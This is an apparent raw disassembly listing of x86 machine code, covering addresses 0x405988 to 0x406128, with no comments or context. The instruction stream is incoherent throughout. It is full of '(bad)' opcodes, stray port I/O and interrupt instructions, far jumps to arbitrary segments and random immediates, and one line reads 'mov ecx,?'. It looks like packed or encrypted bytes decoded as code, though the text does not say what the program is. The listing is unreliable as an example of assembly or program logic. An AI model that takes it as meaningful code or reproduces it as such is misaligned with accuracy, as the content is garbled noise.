  405988:	stos   BYTE PTR es:[edi],al
  405989:	push   0x26ea3104
  40598e:	mov    DWORD PTR [esi],ecx
  405990:	pop    ecx
  405991:	fs pop edi
  405993:	mov    ah,0x8a
  405995:	popf   
  405996:	int    0x5d
  405998:	popa   
  405999:	or     edi,DWORD PTR ss:[ebx+0x7bec9151]
  4059a0:	push   esi
  4059a1:	popa   
  4059a2:	lds    edi,FWORD PTR [eax-0x6403b96b]
  4059a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059a9:	in     eax,0x88
  4059ab:	add    DWORD PTR [esi+0x13],0xffffffea
  4059af:	imul   esi,DWORD PTR [esi],0xa3c22c8f
  4059b5:	xor    al,0x32
  4059b7:	xchg   DWORD PTR [edx],ebx
  4059b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059ba:	outs   dx,DWORD PTR ds:[esi]
  4059bb:	(bad)  
  4059bc:	(bad)  
  4059be:	xchg   ebp,eax
  4059bf:	pop    esi
  4059c0:	out    dx,al
  4059c1:	xor    eax,DWORD PTR [edi+0x523ceda5]
  4059c7:	loope  0x405a31
  4059c9:	ss xchg ecx,eax
  4059cb:	in     eax,dx
  4059cc:	imul   esi,DWORD PTR [esi-0x410c05b7],0xc15b63ec
  4059d6:	cmp    al,0x19
  4059d8:	cs mov al,0xf4
  4059db:	push   ebp
  4059dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059dd:	retf   0xf996
  4059e0:	bound  esp,QWORD PTR [ebx]
  4059e2:	xchg   ebx,eax
  4059e3:	outs   dx,DWORD PTR ds:[esi]
  4059e4:	xor    eax,0x341496c3
  4059e9:	scas   eax,DWORD PTR es:[edi]
  4059ea:	les    esi,FWORD PTR [esi]
  4059ec:	sub    al,cl
  4059ee:	(bad)  
  4059f0:	xor    DWORD PTR [edi-0x38883f64],esi
  4059f6:	mov    dl,0xba
  4059f8:	cmp    BYTE PTR [ebx],bh
  4059fa:	lods   al,BYTE PTR ds:[esi]
  4059fb:	fs cs pop ss
  4059fe:	add    BYTE PTR [ebx+0x53db89f4],bh
  405a04:	(bad)  
  405a06:	sbb    eax,0xe4af0d55
  405a0b:	inc    esp
  405a0c:	mov    es,WORD PTR [edi-0xd]
  405a0f:	lahf   
  405a10:	shl    DWORD PTR [ecx],1
  405a12:	jmp    ebx
  405a14:	outs   dx,BYTE PTR ds:[esi]
  405a15:	dec    ebx
  405a16:	aaa    
  405a17:	aaa    
  405a18:	sub    edx,DWORD PTR [esi+ecx*2-0x31aa9a85]
  405a1f:	xor    BYTE PTR [edx+eiz*1-0x55],bh
  405a23:	fistp  DWORD PTR [edi-0x70]
  405a26:	cmp    edx,eax
  405a28:	call   0x40293b98
  405a2d:	mov    ebp,0x7eafde6b
  405a32:	lahf   
  405a33:	push   ds
  405a34:	jp     0x405a1c
  405a36:	ds (bad) 
  405a38:	xchg   esi,eax
  405a39:	cmp    DWORD PTR [edx+0x60b7e8a6],edi
  405a3f:	jbe    0x405a16
  405a41:	and    dl,ah
  405a43:	inc    ecx
  405a44:	sbb    dl,BYTE PTR [ebp-0x15]
  405a47:	cmp    BYTE PTR [ebx+0x18],bh
  405a4a:	dec    edi
  405a4b:	push   esi
  405a4c:	jns    0x405a39
  405a4e:	test   al,0x36
  405a50:	int    0x98
  405a52:	sbb    edi,ebx
  405a54:	in     eax,0xf1
  405a56:	mov    esi,0x1a6fad74
  405a5b:	or     DWORD PTR [ecx-0x1b980b9f],ebx
  405a61:	mov    ds:0xa7ab2a89,al
  405a66:	pop    edx
  405a67:	jbe    0x405a7b
  405a69:	xchg   edi,eax
  405a6a:	out    0x2f,al
  405a6c:	jg     0x405ae4
  405a6e:	imul   ebx,ecx,0xffffffd3
  405a71:	stc    
  405a72:	je     0x405a6d
  405a74:	arpl   WORD PTR [esp+ecx*4],cx
  405a77:	(bad)  
  405a78:	scas   eax,DWORD PTR es:[edi]
  405a79:	dec    esp
  405a7a:	xchg   edx,eax
  405a7b:	xchg   edx,esi
  405a7d:	jbe    0x405a48
  405a7f:	imul   ebp,DWORD PTR ds:0x8a957f2e,0xb6093e00
  405a89:	mov    eax,ds:0x3cb23512
  405a8e:	fwait
  405a8f:	xor    ebp,ecx
  405a91:	int    0x19
  405a93:	repz inc eax
  405a95:	hlt    
  405a96:	out    dx,al
  405a97:	scas   eax,DWORD PTR es:[edi]
  405a98:	aad    0xb6
  405a9a:	icebp  
  405a9b:	popa   
  405a9c:	add    al,0x2
  405a9e:	pop    ds
  405a9f:	and    edi,DWORD PTR [ebp-0x25]
  405aa2:	jmp    0xb4afd0e8
  405aa7:	pop    ds
  405aa8:	repz fld TBYTE PTR [esi+ebp*2-0x4d9bb495]
  405ab0:	into   
  405ab1:	out    0xe7,al
  405ab3:	jmp    0x260d8806
  405ab8:	int3   
  405ab9:	fidiv  DWORD PTR [eax+0x38]
  405abc:	rcl    dh,1
  405abe:	sbb    BYTE PTR [edx],dh
  405ac0:	or     eax,0xfd1883fb
  405ac5:	pop    esi
  405ac6:	stos   DWORD PTR es:[edi],eax
  405ac7:	mov    bl,0x71
  405ac9:	scas   eax,DWORD PTR es:[edi]
  405aca:	sub    BYTE PTR [edx+0x43],cl
  405acd:	lea    ecx,[edx-0x7e5dae38]
  405ad3:	das    
  405ad4:	xchg   ecx,eax
  405ad5:	inc    ebx
  405ad6:	outs   dx,BYTE PTR ds:[esi]
  405ad7:	out    0xf8,eax
  405ad9:	mov    dh,0x1c
  405adb:	push   0xdbf460bd
  405ae0:	scas   eax,DWORD PTR es:[edi]
  405ae1:	in     al,0xc
  405ae3:	add    al,0xce
  405ae5:	ins    DWORD PTR es:[edi],dx
  405ae6:	jmp    0x405ad6
  405ae8:	cmc    
  405ae9:	xchg   edx,esp
  405aeb:	xchg   edx,eax
  405aec:	pop    ebx
  405aed:	mov    BYTE PTR [ebx+edi*2],bl
  405af0:	in     al,0x7c
  405af2:	aam    0x5f
  405af4:	outs   dx,BYTE PTR ds:[esi]
  405af5:	mov    eax,0x5b55db87
  405afa:	inc    edi
  405afb:	or     BYTE PTR [edi-0x60],bl
  405afe:	cmc    
  405aff:	mov    bl,BYTE PTR [edx-0x2151b3b6]
  405b05:	ret    0x94a5
  405b08:	ds popa 
  405b0a:	mov    eax,ds:0x873b2c44
  405b0f:	in     eax,dx
  405b10:	pop    ebp
  405b11:	nop
  405b12:	push   cs
  405b13:	mov    ds:0xf8e410cd,eax
  405b18:	mov    al,0x11
  405b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b1b:	cmp    bl,BYTE PTR [ebp+0xaeaf452]
  405b21:	fmul   QWORD PTR [edx]
  405b23:	jbe    0x405b79
  405b25:	xor    DWORD PTR [edx],esp
  405b27:	je     0x405b2e
  405b29:	jns    0x405b33
  405b2b:	cmp    edx,DWORD PTR [ebx+0x6083c400]
  405b31:	ss std 
  405b33:	push   ebp
  405b34:	fs and al,0x2c
  405b37:	fwait
  405b38:	adc    bh,BYTE PTR [edi+0x39b29afa]
  405b3e:	cld    
  405b3f:	inc    esi
  405b40:	fwait
  405b41:	jne    0x405b5b
  405b43:	pop    edi
  405b44:	jae    0x405b74
  405b46:	aad    0x8
  405b48:	out    0xc8,eax
  405b4a:	mov    gs,WORD PTR [edi+0x64]
  405b4d:	retf   0x8d6
  405b50:	jae    0x405aee
  405b52:	pop    es
  405b53:	jg     0x405b51
  405b55:	mov    ebx,0x2134b17e
  405b5a:	cmp    eax,0x4fbf9f9d
  405b5f:	sub    DWORD PTR [ebx],ebp
  405b61:	ds mov eax,0x26189942
  405b67:	inc    esp
  405b68:	(bad)  
  405b69:	mov    ecx,DWORD PTR [ecx+0x50d9871e]
  405b6f:	ja     0x405b4c
  405b71:	push   ss
  405b72:	jb     0x405be9
  405b74:	sub    BYTE PTR [esi+0x2e573c36],bl
  405b7a:	push   ecx
  405b7b:	dec    esp
  405b7c:	je     0x405b72
  405b7e:	(bad)  
  405b7f:	in     eax,0xf1
  405b81:	inc    esp
  405b82:	or     DWORD PTR [esi],edx
  405b84:	ja     0x405b87
  405b86:	pop    ds
  405b87:	jae    0x405b2e
  405b89:	mov    ch,0x79
  405b8b:	jecxz  0x405b7c
  405b8d:	sahf   
  405b8e:	cmc    
  405b8f:	and    ch,BYTE PTR [esi+0x43]
  405b92:	and    al,BYTE PTR [ecx+0x213eba90]
  405b98:	aam    0x8
  405b9a:	cmp    ecx,DWORD PTR [ecx-0x1ccac875]
  405ba0:	mov    WORD PTR [eax-0x64],gs
  405ba3:	mov    al,0x4c
  405ba5:	add    ch,BYTE PTR [esi-0x216c5fad]
  405bab:	or     DWORD PTR [eax],0x3a7a6c01
  405bb1:	lods   al,BYTE PTR ds:[esi]
  405bb2:	add    eax,0xabe8a490
  405bb7:	ret    
  405bb8:	es jo  0x405bfe
  405bbb:	xor    BYTE PTR [esi+esi*1],0x11
  405bbf:	clc    
  405bc0:	repz xchg ecx,eax
  405bc2:	mov    bh,0xb7
  405bc4:	sub    BYTE PTR [ebx-0x5f211762],dh
  405bca:	jecxz  0x405c38
  405bcc:	int3   
  405bcd:	js     0x405b55
  405bcf:	jbe    0x405bcf
  405bd1:	cmp    eax,0x3f47bbd8
  405bd6:	fdivp  st(2),st
  405bd8:	or     eax,0xadc43b84
  405bdd:	(bad)  
  405bde:	mov    ah,0x5b
  405be0:	xchg   BYTE PTR [edx-0x3c7320f5],bh
  405be6:	loopne 0x405bd1
  405be8:	out    dx,eax
  405be9:	scas   eax,DWORD PTR es:[edi]
  405bea:	pop    edx
  405beb:	lea    ebp,[edi+edx*4+0x8f4e624]
  405bf2:	push   ds
  405bf3:	pop    ecx
  405bf4:	fsin   
  405bf6:	imul   esi,DWORD PTR [ebx-0x29379863],0xffffffda
  405bfd:	mov    edi,0x64f4add8
  405c02:	(bad)  
  405c03:	sti    
  405c04:	in     eax,0x9c
  405c06:	pop    edi
  405c07:	xchg   edi,eax
  405c08:	dec    esp
  405c09:	mov    WORD PTR [ebx+0x60ac7a4],fs
  405c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c10:	sub    al,0xb8
  405c12:	mov    al,0x8
  405c14:	and    al,0x62
  405c16:	push   0x2a
  405c18:	mov    ebx,0xf8090674
  405c1d:	call   0xeef97f2b
  405c22:	dec    esi
  405c23:	pop    ecx
  405c24:	mov    al,0xe4
  405c26:	xchg   esp,eax
  405c27:	aad    0xca
  405c29:	out    dx,al
  405c2a:	mov    ch,0xf0
  405c2c:	sahf   
  405c2d:	inc    ecx
  405c2e:	hlt    
  405c2f:	adc    esi,ecx
  405c31:	stc    
  405c32:	adc    eax,0x1ec68dad
  405c37:	pusha  
  405c38:	fistp  QWORD PTR [edx-0x309cd497]
  405c3e:	cwde   
  405c3f:	cmp    bl,BYTE PTR [eax]
  405c41:	dec    edx
  405c42:	push   ebp
  405c43:	pop    eax
  405c45:	sbb    bl,BYTE PTR [edi+0x7f1fabb6]
  405c4b:	mov    ebx,0x29d12760
  405c50:	sbb    DWORD PTR [edx+0x54],0xf
  405c54:	mov    ds:0x6a265f97,eax
  405c59:	mov    WORD PTR [esp+eax*1+0x44],cs
  405c5d:	mov    ch,0xe3
  405c5f:	clc    
  405c60:	hlt    
  405c61:	mov    ebp,0x4cee9bf0
  405c66:	jmp    0xcc8e:0xba48a917
  405c6d:	ins    DWORD PTR es:[edi],dx
  405c6e:	sub    ah,BYTE PTR [edi]
  405c70:	clc    
  405c71:	(bad)  
  405c72:	sbb    bh,BYTE PTR [esi]
  405c74:	pop    eax
  405c75:	aaa    
  405c76:	mov    eax,ds:0x93279778
  405c7b:	cwde   
  405c7c:	fsubr  st,st(1)
  405c7e:	pop    eax
  405c7f:	popf   
  405c80:	test   BYTE PTR ss:[ecx-0x768741bf],al
  405c87:	ins    BYTE PTR es:[edi],dx
  405c88:	push   ds
  405c89:	jg     0x405c64
  405c8b:	fwait
  405c8c:	add    ebx,ebp
  405c8e:	or     eax,0x8babe48
  405c93:	daa    
  405c94:	ins    DWORD PTR es:[edi],dx
  405c95:	test   al,0x9e
  405c97:	sbb    DWORD PTR [ecx],ecx
  405c99:	jae    0x405d0f
  405c9b:	sbb    bl,dh
  405c9d:	sbb    BYTE PTR [ecx-0xdc871ba],cl
  405ca3:	inc    edx
  405ca4:	mov    dl,0xd5
  405ca6:	mov    esp,edi
  405ca8:	loopne 0x405c5f
  405caa:	hlt    
  405cab:	into   
  405cac:	lods   al,BYTE PTR ds:[esi]
  405cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cae:	jae    0x405c52
  405cb0:	xchg   esp,eax
  405cb1:	pop    esp
  405cb2:	and    al,0x50
  405cb4:	pop    edi
  405cb5:	aam    0x52
  405cb7:	scas   eax,DWORD PTR es:[edi]
  405cb8:	push   eax
  405cb9:	mov    dh,0x11
  405cbb:	(bad)  
  405cbc:	loopne 0x405d26
  405cbe:	jp     0x405d02
  405cc0:	pop    ss
  405cc1:	inc    edi
  405cc2:	(bad)  
  405cc3:	cmp    eax,0x35b457d
  405cc8:	dec    edx
  405cc9:	fadd   QWORD PTR [esi-0x5c]
  405ccc:	bound  edx,QWORD PTR [edx]
  405cce:	hlt    
  405ccf:	cmp    DWORD PTR [eax-0x13e8e5d3],0xffffffb7
  405cd6:	inc    esi
  405cd7:	sub    dh,BYTE PTR [esi+esi*2-0x23e06508]
  405cde:	jge    0x405d1d
  405ce0:	mov    edx,0x7e55144a
  405ce5:	mov    al,0x6
  405ce7:	add    al,0xcc
  405ce9:	add    al,0x4
  405ceb:	int    0xe6
  405ced:	jge    0x405cff
  405cef:	sub    eax,0x57b6c16a
  405cf4:	pop    edx
  405cf5:	jae    0x405c7a
  405cf7:	xchg   esp,eax
  405cf8:	xchg   edi,eax
  405cf9:	inc    ebp
  405cfa:	arpl   WORD PTR [ebp-0x54bb250f],cx
  405d00:	iret   
  405d01:	ja     0x405d61
  405d03:	cs dec esi
  405d05:	mov    si,0x599a
  405d09:	or     eax,0xa2cf9da5
  405d0e:	lahf   
  405d0f:	jo     0x405d2e
  405d11:	and    DWORD PTR [esi-0x22d4743b],edx
  405d17:	addr16 test eax,edx
  405d1a:	(bad)  
  405d1b:	lods   eax,DWORD PTR ds:[esi]
  405d1c:	xchg   edx,eax
  405d1d:	lahf   
  405d1e:	cdq    
  405d1f:	adc    al,BYTE PTR [ecx+0x75]
  405d22:	push   cs
  405d23:	mov    ch,0x44
  405d25:	pop    ebx
  405d26:	dec    esp
  405d27:	adc    ebx,DWORD PTR [ebx+eax*4+0x22895850]
  405d2e:	pop    ebx
  405d2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d30:	and    cl,bl
  405d32:	fild   WORD PTR ds:0x48d12759
  405d38:	and    ecx,DWORD PTR [ebp+0x2e5a008]
  405d3e:	adc    BYTE PTR [ecx-0x2b24f56],0xc7
  405d45:	ja     0x405ced
  405d47:	std    
  405d48:	xchg   edi,eax
  405d49:	pop    ecx
  405d4a:	ret    
  405d4b:	ret    
  405d4c:	int3   
  405d4d:	call   0x7d2d:0xbafa3886
  405d54:	xlat   BYTE PTR ds:[ebx]
  405d55:	adc    eax,DWORD PTR [eax]
  405d57:	lea    esi,[ebp+0x21]
  405d5a:	add    dh,dl
  405d5c:	jl     0x405db6
  405d5e:	and    eax,0x6d6b24c5
  405d63:	mov    eax,ds:0x96fc9230
  405d68:	add    DWORD PTR [edx-0x48],edi
  405d6b:	push   edx
  405d6c:	cmp    al,0xd5
  405d6e:	mov    dl,0x87
  405d70:	fdivr  DWORD PTR [edx+esi*2]
  405d73:	mov    edi,0x8cf36ff0
  405d78:	pop    ecx
  405d79:	ins    BYTE PTR es:[edi],dx
  405d7a:	in     al,0x7e
  405d7c:	dec    ecx
  405d7d:	mov    dl,0xba
  405d7f:	out    dx,eax
  405d80:	xchg   esp,eax
  405d81:	cmp    al,0xae
  405d83:	xor    al,0xe5
  405d85:	push   ds
  405d86:	jmp    0x405dce
  405d88:	sti    
  405d89:	mov    ds:0xb7d4383b,eax
  405d8e:	lds    edi,FWORD PTR [esp+edx*8+0x18a6fab7]
  405d95:	cmp    DWORD PTR [eax+0x13a39b94],edx
  405d9b:	or     al,0x79
  405d9d:	inc    esi
  405d9e:	inc    esi
  405d9f:	sub    eax,0x45724949
  405da4:	push   0x20
  405da6:	jbe    0x405d54
  405da8:	push   ebx
  405da9:	cs lock popf 
  405dac:	int3   
  405dad:	test   DWORD PTR [ebp-0x6254ef4c],esi
  405db3:	adc    al,0x66
  405db5:	mov    al,ds:0xac9f9f07
  405dba:	fmul   DWORD PTR [ebx]
  405dbc:	jge    0x405da5
  405dbe:	push   cs
  405dbf:	pop    eax
  405dc0:	pop    ebx
  405dc1:	and    al,bl
  405dc3:	push   ds
  405dc4:	ins    BYTE PTR es:[edi],dx
  405dc5:	sar    DWORD PTR [eax+0x1b75e1e3],1
  405dcb:	push   ecx
  405dcc:	mov    bh,0x46
  405dce:	daa    
  405dcf:	push   es
  405dd0:	add    ebx,DWORD PTR [ecx-0x50]
  405dd3:	out    dx,al
  405dd4:	mov    ebx,0xc18b4143
  405dd9:	jne    0x405da5
  405ddb:	lea    esi,[edx-0x61]
  405dde:	inc    ebp
  405ddf:	xor    DWORD PTR [esp+edi*2-0x5c],0xffffffa7
  405de4:	sbb    BYTE PTR [edx-0x6d],ah
  405de7:	jb     0x405df9
  405de9:	leave  
  405dea:	mov    BYTE PTR [edx],0x86
  405ded:	loopne 0x405df8
  405def:	sahf   
  405df0:	inc    esp
  405df1:	dec    ebx
  405df2:	repz sub BYTE PTR [esi-0x76],dl
  405df6:	stos   DWORD PTR es:[edi],eax
  405df7:	shl    BYTE PTR [edi-0x5041c708],cl
  405dfd:	ds gs jg 0x405dc2
  405e01:	clc    
  405e02:	in     eax,dx
  405e03:	cs pushf 
  405e05:	test   al,0x17
  405e07:	fs addr16 add eax,0x7f3d01a8
  405e0e:	jl     0x405e86
  405e10:	jnp    0x405db0
  405e12:	sub    al,0xd3
  405e14:	sub    DWORD PTR [edx+0x58914c2a],0x5680c89a
  405e1e:	int    0xdb
  405e20:	or     DWORD PTR [edx-0x51],ebp
  405e23:	retf   0x529e
  405e26:	hlt    
  405e27:	rcr    DWORD PTR [edx-0x73],1
  405e2a:	std    
  405e2b:	xor    ch,BYTE PTR [esi-0x2d]
  405e2e:	(bad)  
  405e2f:	out    dx,eax
  405e30:	int3   
  405e31:	mov    ds:0x71a10e09,al
  405e36:	je     0x405e0d
  405e38:	cmp    al,0x2f
  405e3a:	dec    ecx
  405e3b:	sti    
  405e3c:	lods   eax,DWORD PTR ds:[esi]
  405e3d:	ret    0xe5f7
  405e40:	sub    cl,ah
  405e42:	sahf   
  405e43:	jmp    0xa1e2:0x137252a5
  405e4a:	sbb    esi,DWORD PTR [eax+0x62e95958]
  405e50:	xlat   BYTE PTR ds:[ebx]
  405e51:	arpl   WORD PTR [edx-0x29cf3b9],di
  405e57:	mov    bh,ch
  405e59:	mov    al,bh
  405e5b:	add    esi,DWORD PTR ds:0x578f530f
  405e61:	sti    
  405e62:	add    DWORD PTR [ebx+ebp*2],ebx
  405e65:	mov    edx,0x7592dedd
  405e6a:	ret    0xe7f
  405e6d:	pop    ss
  405e6e:	push   cs
  405e6f:	stos   BYTE PTR es:[edi],al
  405e70:	daa    
  405e71:	lahf   
  405e72:	mov    edx,0xb81c5a3f
  405e77:	cwde   
  405e78:	mov    DWORD PTR [edx-0xc],esi
  405e7b:	lds    ebp,FWORD PTR ds:[edi-0x72]
  405e7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e80:	xor    dh,BYTE PTR [ebp+0xa]
  405e83:	xchg   edx,eax
  405e84:	cmovp  ebp,DWORD PTR [edx]
  405e87:	(bad)  
  405e88:	fadd   DWORD PTR [edx]
  405e8a:	fdivr  QWORD PTR [ebx-0x6e7768f0]
  405e90:	fdiv   st(4),st
  405e92:	jns    0x405ea4
  405e94:	and    cl,dh
  405e96:	and    al,BYTE PTR [ecx+edi*2]
  405e99:	aaa    
  405e9a:	shr    DWORD PTR [ebx-0x7e210c58],cl
  405ea0:	shr    BYTE PTR [ebx+0x8],cl
  405ea3:	sbb    eax,0xbb9cce2d
  405ea8:	inc    esp
  405ea9:	mov    cl,BYTE PTR gs:[esi]
  405eac:	mov    eax,0x29cd016d
  405eb1:	out    dx,eax
  405eb2:	ss mov bl,0x30
  405eb5:	test   al,0xee
  405eb7:	mov    al,0x19
  405eb9:	loope  0x405e3c
  405ebb:	cmp    al,0x9
  405ebd:	mov    eax,0xe311c9c8
  405ec2:	out    dx,eax
  405ec3:	call   0x9e22:0x1c015bae
  405eca:	lods   al,BYTE PTR ds:[esi]
  405ecb:	fmul   DWORD PTR [esi-0x1cd7932a]
  405ed1:	adc    al,0xf
  405ed3:	or     ah,dl
  405ed5:	push   edi
  405ed6:	repz ret 0x78c3
  405eda:	ins    BYTE PTR es:[edi],dx
  405edb:	xor    BYTE PTR [eax+edi*4-0x54],0xfa
  405ee0:	cmp    BYTE PTR [esi],0x60
  405ee3:	mov    ch,0xc2
  405ee5:	(bad)  
  405ee6:	repnz push 0x5d34c7a0
  405eec:	and    DWORD PTR [ebx+ebx*1+0x4516926e],ebx
  405ef3:	ins    BYTE PTR es:[edi],dx
  405ef4:	jge    0x405f67
  405ef6:	dec    edi
  405ef7:	jnp    0x405ee3
  405ef9:	repnz mov edx,0xee19fccc
  405eff:	mov    bh,0x7a
  405f01:	aad    0x53
  405f03:	fsubr  QWORD PTR [ecx]
  405f05:	bound  edi,QWORD PTR [ecx+0x22ce7a1]
  405f0b:	jge    0x405f7a
  405f0d:	mov    esp,0x2f0eab4f
  405f12:	sbb    eax,0x4e5d7053
  405f17:	push   cs
  405f18:	(bad)  
  405f19:	sbb    al,0x47
  405f1b:	test   al,0x58
  405f1d:	jb     0x405ea0
  405f1f:	mov    cl,0xe
  405f21:	xchg   esi,eax
  405f22:	pop    esp
  405f23:	shl    DWORD PTR [esi-0x1e1cf2b9],0x4d
  405f2a:	dec    esp
  405f2b:	adc    esp,esi
  405f2d:	or     eax,0xc629c934
  405f32:	sub    DWORD PTR [esi+ecx*1+0x39],eax
  405f36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f37:	mov    esp,0x5a510962
  405f3c:	mov    ecx,0x20ef93e7
  405f41:	out    0xd2,eax
  405f43:	shl    DWORD PTR [ebp+0x22],0x97
  405f47:	sbb    ch,BYTE PTR [ecx]
  405f49:	mov    ss,WORD PTR [ecx]
  405f4b:	mov    esp,0xeadeeb04
  405f50:	shr    BYTE PTR [edx+ebx*1+0x3309e5a9],1
  405f57:	jp     0x405efd
  405f59:	inc    eax
  405f5a:	sub    eax,0x939c000b
  405f5f:	push   esp
  405f60:	(bad)  
  405f61:	hlt    
  405f62:	dec    edi
  405f63:	cmc    
  405f64:	adc    al,0xb1
  405f66:	push   ecx
  405f67:	jecxz  0x405f69
  405f69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f6a:	sbb    eax,0xffffffdb
  405f6d:	dec    ebp
  405f6e:	and    ah,ch
  405f70:	pop    esp
  405f71:	lds    edx,FWORD PTR [edi+0x14fbc1eb]
  405f77:	jge    0x405f38
  405f79:	aad    0x8c
  405f7b:	fnstenv [esp+ecx*2+0x18]
  405f7f:	mov    ebp,0xfefe494d
  405f84:	clc    
  405f85:	mov    bh,0x13
  405f87:	cmp    eax,0x2bf87eb4
  405f8c:	cmp    dl,BYTE PTR [edi]
  405f8e:	sub    dl,BYTE PTR [edx+0x143e8874]
  405f94:	jmp    DWORD PTR [bx-0xf1d]
  405f99:	ds xchg ebx,eax
  405f9b:	popa   
  405f9c:	dec    esi
  405f9d:	jns    0x405f71
  405f9f:	push   edi
  405fa0:	and    al,BYTE PTR [eax-0x6e]
  405fa3:	fcmovnu st,st(4)
  405fa6:	jp     0x405f78
  405fa8:	call   0x7e08:0xe7baa6a9
  405faf:	adc    DWORD PTR [esi-0x15],edx
  405fb2:	jl     0x405fea
  405fb4:	imul   eax,DWORD PTR [esi+0x62],0xa07d28e3
  405fbb:	xchg   esi,eax
  405fbc:	add    al,0x3
  405fbe:	cmp    eax,0x7a16bfbd
  405fc3:	dec    edx
  405fc4:	sub    esi,esi
  405fc6:	aam    0xb4
  405fc8:	xchg   esp,eax
  405fc9:	adc    edx,DWORD PTR [ebx]
  405fcb:	jge    0x405f57
  405fcd:	ins    BYTE PTR es:[edi],dx
  405fce:	and    DWORD PTR [edi-0x51],edi
  405fd1:	rcl    BYTE PTR [esi],1
  405fd3:	and    esp,DWORD PTR [edi+0x5a]
  405fd6:	mov    dh,0xbf
  405fd8:	jne    0x40600e
  405fda:	das    
  405fdb:	xor    eax,DWORD PTR [ebx]
  405fdd:	nop
  405fde:	ret    
  405fdf:	call   0x480f:0x44115ca8
  405fe6:	xchg   esi,eax
  405fe7:	sbb    DWORD PTR [eax-0x5e4ecf9c],ebp
  405fed:	sbb    BYTE PTR [edx],0x29
  405ff0:	mov    ebp,0x846ba2f0
  405ff5:	inc    esp
  405ff6:	sub    ecx,DWORD PTR [edi+ecx*4]
  405ff9:	lea    esp,[edx]
  405ffb:	dec    eax
  405ffc:	popf   
  405ffd:	fwait
  405ffe:	dec    esi
  405fff:	push   ss
  406000:	push   edi
  406001:	out    dx,eax
  406002:	js     0x40601c
  406004:	out    dx,eax
  406005:	jle    0x406077
  406007:	inc    ebx
  406008:	js     0x405fdf
  40600a:	rcr    dh,cl
  40600c:	push   es
  40600d:	les    eax,FWORD PTR [ebx]
  40600f:	push   ebx
  406010:	es enter 0xc66a,0xb8
  406015:	push   ds
  406016:	mov    ebp,DWORD PTR [ecx+0x49]
  406019:	jne    0x406096
  40601b:	cwde   
  40601c:	and    eax,0x1f39aeb4
  406021:	fldcw  WORD PTR [eax-0x4a3c7882]
  406027:	pop    ds
  406028:	push   es
  406029:	in     al,0xd8
  40602b:	and    cl,BYTE PTR [eax-0x3bc09cab]
  406031:	pop    edi
  406032:	lock jae 0x405fd6
  406035:	push   es
  406036:	repnz loopne 0x40605b
  406039:	push   ds
  40603a:	scas   al,BYTE PTR es:[edi]
  40603b:	inc    eax
  40603c:	out    0xc6,eax
  40603e:	sbb    ch,BYTE PTR [eax+0x3509e434]
  406044:	jp     0x40605e
  406046:	jo     0x406070
  406048:	push   ebp
  406049:	arpl   WORD PTR [ebp+esi*4-0x19],di
  40604d:	dec    ebx
  40604e:	aam    0x92
  406050:	push   esp
  406051:	dec    esp
  406052:	les    edx,FWORD PTR [ebx-0x5]
  406055:	mov    ch,0x86
  406057:	xchg   ebp,eax
  406058:	test   DWORD PTR [esi+ecx*1],esp
  40605b:	retf   
  40605c:	pop    ds
  40605d:	int3   
  40605e:	dec    ebx
  40605f:	jp     0x4060c4
  406061:	mov    ecx,0xd0139c69
  406066:	sahf   
  406067:	icebp  
  406068:	lods   eax,DWORD PTR ds:[esi]
  406069:	push   ebp
  40606a:	je     0x40608d
  40606c:	rcl    ah,1
  40606e:	cmp    DWORD PTR [eax+0x7f54eed0],ecx
  406074:	mov    ds:0x301bc0df,eax
  406079:	outs   dx,DWORD PTR ds:[esi]
  40607a:	test   eax,0xcf8dcedd
  40607f:	or     ch,BYTE PTR [esi]
  406081:	scas   eax,DWORD PTR es:[edi]
  406082:	test   DWORD PTR [edi+0x67],0x5cd1c1f5
  406089:	into   
  40608a:	popf   
  40608b:	shl    BYTE PTR [ebx+esi*4],0xa0
  40608f:	(bad)  [esi+edx*1]
  406092:	iret   
  406093:	test   eax,0x4a8fa885
  406098:	call   0x5c4d:0xb42f329b
  40609f:	test   BYTE PTR [ebp-0x7f],ch
  4060a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060a3:	(bad)  
  4060a4:	cmp    al,0x12
  4060a6:	scas   al,BYTE PTR es:[edi]
  4060a7:	xor    eax,0x5262efd
  4060ac:	sbb    cl,BYTE PTR [esi-0x14]
  4060af:	pop    edi
  4060b0:	es clc 
  4060b2:	or     bl,cl
  4060b4:	cmp    BYTE PTR [esi],al
  4060b6:	std    
  4060b7:	aaa    
  4060b8:	jle    0x4060e2
  4060ba:	sbb    ch,BYTE PTR ds:0x89df15d1
  4060c0:	xor    eax,0xe9275c51
  4060c5:	outs   dx,DWORD PTR ds:[esi]
  4060c6:	push   ds
  4060c7:	jle    0x40610b
  4060c9:	sbb    DWORD PTR [esi-0x4fa49137],esp
  4060cf:	rcr    BYTE PTR [ecx+0x5b],0x8d
  4060d3:	mov    dh,0x49
  4060d5:	cdq    
  4060d6:	pusha  
  4060d7:	push   edx
  4060d8:	and    bl,BYTE PTR ds:0x95b3e020
  4060de:	jmp    0x2d8f7cf7
  4060e3:	jne    0x4060ec
  4060e5:	sbb    esi,ecx
  4060e7:	cmp    BYTE PTR [eax],ah
  4060e9:	add    BYTE PTR [ebx],ch
  4060eb:	out    dx,eax
  4060ec:	dec    ecx
  4060ed:	xchg   edx,eax
  4060ee:	fucom  st(7)
  4060f0:	mov    edi,0x36c5724e
  4060f5:	fisubr WORD PTR [eax-0x26]
  4060f8:	sbb    eax,0x34f97f20
  4060fd:	sbb    dl,BYTE PTR [edi+0x32]
  406100:	push   esi
  406101:	and    al,0x43
  406103:	dec    ecx
  406104:	mov    cl,0x52
  406106:	jp     0x406088
  406108:	retf   0xf496
  40610b:	aam    0x2f
  40610d:	push   esi
  40610e:	xor    esp,esp
  406110:	or     eax,0x1caad9a3
  406115:	or     BYTE PTR [edi-0x38c4843],al
  40611b:	test   eax,0x947f674
  406120:	ret    0xddb0
  406123:	dec    edi
  406124:	mov    ecx,?
  406126:	addr16 dec edi
  406128:	mov    al,ds:0x5b4a53ec
